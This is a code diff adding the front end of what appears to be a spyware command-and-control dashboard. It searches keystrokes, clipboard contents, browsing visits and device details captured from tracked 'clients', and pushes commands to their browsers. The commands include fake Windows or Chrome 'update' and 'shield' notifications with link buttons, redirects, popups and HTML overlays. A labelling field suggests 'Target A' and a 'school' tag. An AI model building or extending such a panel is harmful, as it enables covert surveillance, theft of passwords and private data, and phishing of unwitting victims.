+        data = { icon: $('#cmd-icon').value, app: $('#cmd-app').value, title: $('#cmd-title').value,
+            message: $('#cmd-msg').value, duration: parseInt($('#cmd-dur').value) || 8000, buttons: [] };
+        const b1 = $('#cmd-btn1').value; if (b1) data.buttons.push({ text: b1, url: $('#cmd-btn1url').value });
+        const b2 = $('#cmd-btn2').value; if (b2) data.buttons.push({ text: b2, url: $('#cmd-btn2url').value });
+    } else if (type === 'alert') { data = { message: $('#cmd-alert-msg')?.value || '' }; }
+      else if (type === 'redirect') { data = { url: $('#cmd-redir-url')?.value || '' }; }
+      else if (type === 'sound') { data = { frequency: parseInt($('#cmd-freq')?.value)||440, duration: parseInt($('#cmd-sound-dur')?.value)||500, volume: (parseInt($('#cmd-vol')?.value)||30)/100 }; }
+      else if (type === 'popup') { data = { url: $('#cmd-popup-url')?.value||'', width: parseInt($('#cmd-popup-w')?.value)||500, height: parseInt($('#cmd-popup-h')?.value)||400 }; }
+      else if (type === 'overlay') { data = { html: $('#cmd-overlay-html')?.value||'', duration: parseInt($('#cmd-overlay-dur')?.value)||0 }; }
+    const r = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify({ target, type, data }) });
+    if (r.ok) toast(`\u26A1 Command verstuurd: ${type} \u2192 ${target}`);
+}
+
+function previewNotif() {
+    const p = $('#cmd-preview');
+    const icons = { shield:'\uD83D\uDEE1\uFE0F', info:'\u2139\uFE0F', warning:'\u26A0\uFE0F', chrome:'\uD83C\uDF10', edge:'\uD83C\uDF10', windows:'\uD83E\uDE9F', update:'\uD83D\uDD04' };
+    const ico = icons[$('#cmd-icon').value] || '\u2139\uFE0F';
+    const app = escHtml($('#cmd-app').value || 'System');
+    const title = escHtml($('#cmd-title').value || 'Titel');
+    const msg = escHtml($('#cmd-msg').value || 'Bericht');
+    const b1 = escHtml($('#cmd-btn1').value), b2 = escHtml($('#cmd-btn2').value);
+    p.innerHTML = `<div style="position:absolute;bottom:12px;right:12px;width:320px;background:#2d2d2d;border-radius:8px;border:1px solid #404040;font-family:'Segoe UI',sans-serif;color:#fff;box-shadow:0 4px 20px rgba(0,0,0,.3);overflow:hidden">
+        <div style="padding:10px 14px 4px;font-size:12px;color:#5f6368;display:flex;align-items:center;gap:6px">${ico} ${app}</div>
+        <div style="padding:4px 14px 12px"><div style="font-size:14px;font-weight:600;margin-bottom:3px">${title}</div><div style="font-size:13px;color:#5f6368;line-height:1.4">${msg}</div></div>
+        ${(b1||b2)?`<div style="display:flex;border-top:1px solid #404040">${b1?`<div style="flex:1;padding:10px;text-align:center;color:#60cdff;font-size:13px;cursor:default${b2?';border-right:1px solid #404040':''}">${b1}</div>`:''}${b2?`<div style="flex:1;padding:10px;text-align:center;color:#60cdff;font-size:13px;cursor:default">${b2}</div>`:''}</div>`:''}
+    </div>`;
+}
+
+function updateCmdTargets() {
+    api('/api/stats').then(stats => {
+        if (!stats) return;
+        const sel = $('#cmd-target'), val = sel.value;
+        const ids = Object.keys(stats.clients || {}).sort();
+        sel.innerHTML = '<option value="all">Alle Clients</option>' + ids.map(id =>
+            `<option value="${id}" ${val===id?'selected':''}>${id}${stats.clients[id].online?' (online)':''}</option>`
+        ).join('');
+    });
+}
+
+function toast(msg) {
+    const area = $('#toasts'), t = document.createElement('div');
+    t.className = 'toast command'; t.textContent = msg;
+    area.appendChild(t); setTimeout(() => t.remove(), 4000);
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  GLOBAL SEARCH
+// ═══════════════════════════════════════════════════════════════
+
+// ── Activity Chart ──
+let activityData = [];
+function updateActivityChart() {
+    // Bucket events into 5-minute slots for the last hour
+    const now = Date.now();
+    const slots = 12; // 12 x 5min = 1 hour
+    const buckets = new Array(slots).fill(0);
+    events.forEach(ev => {
+        const age = now - new Date(ev.timestamp).getTime();
+        const slot = Math.floor(age / 300000); // 5min buckets
+        if (slot >= 0 && slot < slots) buckets[slots - 1 - slot]++;
+    });
+    const canvas = $('#activityChart');
+    if (!canvas) return;
+    const ctx = canvas.getContext('2d');
+    const w = canvas.width = canvas.offsetWidth * 2;
+    const h = canvas.height = 240;
+    ctx.clearRect(0, 0, w, h);
+    const max = Math.max(...buckets, 1);
+    const barW = (w - 40) / slots;
+    const barGap = 4;
+
+    // Draw grid
+    ctx.strokeStyle = '#dadce0';
+    ctx.lineWidth = 1;
+    for (let i = 0; i <= 4; i++) {
+        const y = 20 + (h - 40) * (1 - i / 4);
+        ctx.beginPath(); ctx.moveTo(30, y); ctx.lineTo(w - 10, y); ctx.stroke();
+        ctx.fillStyle = '#5f6368';
+        ctx.font = '16px Consolas';
+        ctx.fillText(Math.round(max * i / 4), 2, y + 5);
+    }
+
+    // Draw bars with gradient
+    buckets.forEach((v, i) => {
+        const x = 30 + i * barW + barGap;
+        const bh = Math.max(1, (v / max) * (h - 50));
+        const y = h - 25 - bh;
+        const grad = ctx.createLinearGradient(x, y, x, h - 25);
+        grad.addColorStop(0, '#1a73e8');
+        grad.addColorStop(1, '#1a73e822');
+        ctx.fillStyle = grad;
+        ctx.beginPath();
+        ctx.roundRect(x, y, barW - barGap * 2, bh, [4, 4, 0, 0]);
+        ctx.fill();
+    });
+
+    // Time labels
+    ctx.fillStyle = '#5f6368';
+    ctx.font = '14px Consolas';
+    ctx.textAlign = 'center';
+    [0, 3, 6, 9, 11].forEach(i => {
+        const x = 30 + i * barW + barW / 2;
+        const mins = (slots - 1 - i) * 5;
+        ctx.fillText(mins === 0 ? 'now' : `-${mins}m`, x, h - 5);
+    });
+}
+
+let searchTimeout = null;
+function onGlobalSearch(e) {
+    if (e.key === 'Enter') { doGlobalSearch(); return; }
+    clearTimeout(searchTimeout);
+    searchTimeout = setTimeout(doGlobalSearch, 400);
+}
+
+async function doGlobalSearch() {
+    const q = ($('#globalSearch')?.value || '').trim();
+    if (q.length < 2) { closeSearch(); return; }
+    const data = await api('/api/search?q=' + encodeURIComponent(q));
+    if (!data) return;
+    const results = data.results || {};
+    const body = $('#sr-body');
+    if (Object.keys(results).length === 0) {
+        body.innerHTML = '<div class="empty" style="padding:20px">No results found</div>';
+        $('#search-results').classList.add('show');
+        return;
+    }
+    const icons = { clients: '👤', keystrokes: '⌨️', clipboard: '📋', visits: '🌐', devices: '📱', errors: '⚠️' };
+    let html = '';
+    for (const [type, items] of Object.entries(results)) {
+        html += `<div class="sr-group"><div class="sr-group-title">${icons[type]||''} ${type} (${items.length})</div>`;
+        items.forEach(item => {
+            let text = '', meta = '';
+            if (type === 'clients') { text = item.id; meta = `${item.online?'Online':'Offline'} · ${item.ip||''}`; }
+            else if (type === 'keystrokes') { text = item.keys.slice(0, 100); meta = `${item.clientId} · ${fmtTime(item.timestamp)}`; }
+            else if (type === 'clipboard') { text = (item.content||'').slice(0, 100); meta = `${item.clientId} · ${fmtTime(item.timestamp)}`; }
+            else if (type === 'visits') { text = item.url||''; meta = `${item.clientId} · ${item.title||''} · ${fmtTime(item.timestamp)}`; }
+            else if (type === 'devices') { text = item.clientId; meta = `${item.platform||''} · ${item.ip||''}`; }
+            else if (type === 'errors') { text = item.message||''; meta = `${item.clientId} · ${fmtTime(item.timestamp)}`; }
+            // Highlight matching text
+            const re = new RegExp(`(${q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')})`, 'gi');
+            text = escHtml(text).replace(re, '<span class="sr-highlight">$1</span>');
+            html += `<div class="sr-item"><div>${text}</div><div class="sr-meta">${escHtml(meta)}</div></div>`;
+        });
+        html += '</div>';
+    }
+    body.innerHTML = html;
+    $('#search-results').classList.add('show');
+}
+
+function closeSearch() {
+    $('#search-results').classList.remove('show');
+}
+
+// Close search on click outside
+document.addEventListener('click', e => {
+    const sr = $('#search-results');
+    const sw = document.querySelector('.search-wrap');
+    if (sr && sr.classList.contains('show') && !sr.contains(e.target) && !sw?.contains(e.target)) {
+        closeSearch();
+    }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  AUTO-REFRESH
+// ═══════════════════════════════════════════════════════════════
+setInterval(refreshAll, 5000);
+</script>
+
+<!-- NOTES MODAL -->
+<div id="notes-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:9999;align-items:center;justify-content:center" onclick="if(event.target===this)closeNotes()">
+    <div style="background:var(--panel);border:1px solid var(--border2);border-radius:var(--radius);width:min(480px,95vw);max-height:80vh;display:flex;flex-direction:column;box-shadow:0 8px 40px #000">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid var(--border)">
+            <h3 style="margin:0;font-size:.85rem;color:var(--accent)">Notes - <span id="notes-client-label" style="color:var(--text2)"></span></h3>
+            <button onclick="closeNotes()" style="background:none;border:none;color:var(--text2);font-size:1.1rem;cursor:pointer;line-height:1">x</button>
+        </div>
+        <div style="padding:12px 16px;border-bottom:1px solid var(--border)">
+            <div style="display:flex;gap:8px">
+                <textarea id="note-input" placeholder="Type a note and press Add..." rows="2" style="flex:1;background:var(--panel2);border:1px solid var(--border2);color:var(--text);border-radius:4px;padding:8px;font-family:inherit;font-size:.75rem;resize:vertical;outline:none"></textarea>
+                <button class="btn" onclick="saveNote()" style="align-self:flex-end">Add</button>
+            </div>
+        </div>
+        <div id="notes-list" style="overflow-y:auto;padding:8px 16px;flex:1"><div class="empty">No notes yet</div></div>
+    </div>
+</div>
+
+<!-- TAG / LABEL MODAL -->
+<div id="tag-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:9999;align-items:center;justify-content:center" onclick="if(event.target===this)closeTagModal()">
+    <div style="background:var(--panel);border:1px solid var(--border2);border-radius:var(--radius);width:min(380px,95vw);box-shadow:0 8px 40px #000">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid var(--border)">
+            <h3 style="margin:0;font-size:.85rem;color:var(--accent)">Label Client - <span id="tag-client-label" style="color:var(--text2)"></span></h3>
+            <button onclick="closeTagModal()" style="background:none;border:none;color:var(--text2);font-size:1.1rem;cursor:pointer;line-height:1">x</button>
+        </div>
+        <div style="padding:16px;display:flex;flex-direction:column;gap:10px">
+            <label style="font-size:.7rem;color:var(--text2)">Display label
+                <input id="tag-label-input" type="text" placeholder="e.g. Target A" style="display:block;width:100%;margin-top:4px;background:var(--panel2);border:1px solid var(--border2);color:var(--text);border-radius:4px;padding:8px;font-family:inherit;font-size:.8rem;box-sizing:border-box;outline:none">
+            </label>
+            <label style="font-size:.7rem;color:var(--text2)">Tags (comma separated)
+                <input id="tag-tags-input" type="text" placeholder="e.g. school, important" style="display:block;width:100%;margin-top:4px;background:var(--panel2);border:1px solid var(--border2);color:var(--text);border-radius:4px;padding:8px;font-family:inherit;font-size:.8rem;box-sizing:border-box;outline:none">
+            </label>
+            <label style="display:flex;align-items:center;gap:8px;font-size:.75rem;color:var(--text);cursor:pointer">
+                <input id="tag-pin-input" type="checkbox" style="width:15px;height:15px;accent-color:var(--accent)"> Pin client (show at top of list)
+            </label>
+            <div style="display:flex;gap:8px;justify-content:flex-end;padding-top:4px">
+                <button class="btn" onclick="closeTagModal()">Cancel</button>
+                <button class="btn" onclick="saveTag()" style="border-color:var(--accent);color:var(--accent)">Save</button>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
